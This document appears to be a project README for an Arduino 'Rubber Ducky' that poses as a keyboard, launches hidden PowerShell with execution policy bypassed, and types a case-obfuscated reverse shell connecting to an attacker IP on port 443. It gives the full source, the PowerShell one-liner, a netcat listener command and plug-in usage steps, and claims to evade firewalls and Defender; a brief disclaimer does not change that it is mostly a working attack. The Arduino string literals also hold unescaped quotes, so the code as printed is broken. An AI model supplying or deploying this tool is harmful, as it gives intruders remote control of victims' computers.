
# Rubber Ducky Arduino Script

This Arduino script transforms your device into a Rubber Ducky that exploits a security vulnerability not yet patched by Microsoft. When executed, it establishes a reverse shell that can bypass firewalls, advanced endpoint monitoring systems, and Microsoft Defender. If configured to use port 443, firewalls interpret the outgoing connection as a secure SSL connection, even though it's actually a reverse shell.

## Features

- Bypasses firewalls and endpoint monitoring systems.
- Evades Microsoft Defender.
- Mimics a secure SSL connection when using port 443.
- Executes a reverse shell from PowerShell.

## Technical Explanation

This script leverages the `Keyboard.h` library to simulate keyboard inputs, effectively typing out commands as if a user were physically typing them. Here’s how it works:

1. **PowerShell Execution**: The script opens PowerShell using the `Windows + R` command to bring up the Run dialog and then types `powershell -NoP -NonI -W Hidden -Exec Bypass`. 

   - `-NoP`: Stands for No Profile. This parameter prevents PowerShell from loading the user's profile, reducing execution time.
   - `-NonI`: Stands for Non-Interactive. This parameter starts PowerShell in non-interactive mode, which is suitable for running scripts.
   - `-W Hidden`: This parameter launches PowerShell in a hidden window, making the execution invisible to the user. The PowerShell window runs in the background without appearing on the desktop.
   - `-Exec Bypass`: This parameter bypasses the PowerShell execution policy, allowing scripts to run without restrictions. This is crucial for executing potentially restricted or untrusted scripts.

2. **Reverse Shell**: The script types a PowerShell command to create a reverse TCP connection to a specified IP address and port. It sends the following command:

   ```powershell
   $c=nEw-oBjECt SYstEm.NEt.SOcKEts.TCPClIEnt("172.18.219.63",443);$s=$c.GetSTreAm();[byte[]]$b=0..65535|%{0};whILe(($i=$s.REad($b,0,$b.LeNgTh))-ne 0){;$d=(NEw-OBjeCT -TYpeNamE sYsTeM.TeXt.ASCIIEncoding).GetStRIng($b,0,$i);$z=(ieX $d 2>&1|oUt-STriNG);$x=$z+"RD "+(pwd)+"#";$y=([text.encoding]::ASCII).GEtByTEs($x);$s.WrIte($y,0,$y.LEnGTh);$s.FlUSh()};$c.CloSE()
   ```

   - This command creates a new TCP client connection to the attacker's IP (`172.18.219.63`) on port `443`.
   - It establishes a stream to send and receive data, effectively creating a shell on the target machine that the attacker can control remotely.

3. **Simulating Keyboard Input**: The Arduino simulates keyboard input using the `Keyboard.print()` and `Keyboard.press()` functions to type out the entire PowerShell command, making it appear as though it was typed by a real user, but invisibly.

## Configuration

Before using this script, you need to make the following configurations:

1. **Adapt Keyboard Layout**: Change `KeyboardLayout_es_ES` in the code if you're not using a Spanish keyboard layout. Adjust it to match your keyboard's country layout, for example, `KeyboardLayout_us` for a US English keyboard.

2. **Configure IP and Port**: Change the IP address `"172.18.219.63"` and port `443` in the script to match the IP and port of your listening machine.

3. **Start Listening**: Before running the script, ensure you are in listening mode on the configured IP and port. This can be done using tools like `netcat`:

   ```bash
   nc -lvnp 443
   ```

## Usage

1. Upload the script to your Arduino device.
2. Plug the device into a USB port on the target machine.
3. The script will execute a sequence that opens PowerShell and establishes a reverse shell back to your listening machine.

**Warning!**: This script is for educational and security research purposes only. Do not use it for malicious activities or without the explicit consent of the target system's owner. Misuse of this script could be illegal.

## Code

```cpp
#include "Keyboard.h"
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Beginning the Keyboard stream
  Keyboard.begin(KeyboardLayout_es_ES);

  // Wait 500ms
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(100);
  Keyboard.print("powershell -NoP -NonI -W Hidden -Exec Bypass");
  delay(100);
  
  typeKey(KEY_RETURN);
  delay(1500);
  
  Keyboard.print("$c=nEw-oBjECt SYstEm.NEt.SOcKEts.TCPClIEnt("172.18.219.63",443);$s=$c.GetSTreAm();[byte[]]$b=0..65535|%{0};whILe(($i=$");
  delay(100);
  
  Keyboard.print("s.REad($b,0,$b.LeNgTh))-ne 0){;$d=(NEw-OBjeCT -TYpeNamE sYsTeM.TeXt.ASCIIEncoding).GetStRIng($b,0,$i);$z=(ieX $d 2>&1|oU");
  delay(100);
  
  Keyboard.print("t-STriNG);$x=$z+"RD "+(pwd)+"#";$y=([text.encoding]::ASCII).GEtByTEs($x);$s.WrIte($y,0,$y.LEnGTh);$s.FlUSh()};$c.CloSE()");
  delay(100);
  
  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
```

## Note

This script has been tested in a controlled environment and has proven effective in evading some of the most common security measures. However, there are always risks associated with the use of offensive security tools. Use this script at your own risk and responsibility.

